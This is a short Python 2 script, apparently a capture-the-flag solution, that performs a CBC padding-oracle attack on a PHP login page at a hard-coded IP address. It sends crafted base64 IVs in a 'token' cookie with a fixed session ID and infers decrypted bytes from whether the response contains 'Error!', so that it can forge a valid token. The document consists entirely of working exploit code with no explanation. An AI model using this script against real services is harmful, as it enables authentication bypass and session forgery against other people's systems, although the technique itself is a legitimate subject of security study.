# -*- coding:utf-8 -*-
import requests
import re
import base64

def add1(data, pos):
    data = list(data)
    data[pos] = chr(ord(data[pos]) + 1)
    return ''.join(data)

def addiv(iv, l):
    return add1(iv.decode('hex'), l).encode('hex')

def addmid(iv, l, mid):
    mid = mid.decode('hex')
    iv = list(iv.decode('hex'))
    mid = chr(ord(iv[l]) ^ (16 - l)) + mid
    return mid.encode('hex')

def newiv(mid, l):
    mid = list(mid.decode('hex'))
    iv = '0' * l * 2
    tmp = 17 - l
    for i in mid:
        iv = iv + chr(ord(i) ^ tmp).encode('hex')
    return iv

iv = '0' * 32
mid = ''
l = 15
ssid = "i0qpe0vpvlntssmvgv8n4os5t5"
#token = "bnp6RThhYnp6Q2hjQjF5Zg=="
#002307365c062a1c5f140a3d60452e77 0 3317264c163a0c4f041a2d70553e67

url = "http://111.231.111.54/login.php"
while l > 0: 
    civ = base64.b64encode(iv.decode('hex')).replace('=', '%3D')
    cookie = {"PHPSESSID":ssid, "token":civ}
    res = requests.get(url, cookies=cookie)
    #print res.content
    if "Error!" not in res.content:
        mid = addmid(iv, l, mid)
        iv = newiv(mid, l)
        l = l - 1
        print iv, l, mid
        continue
    iv = addiv(iv, l)

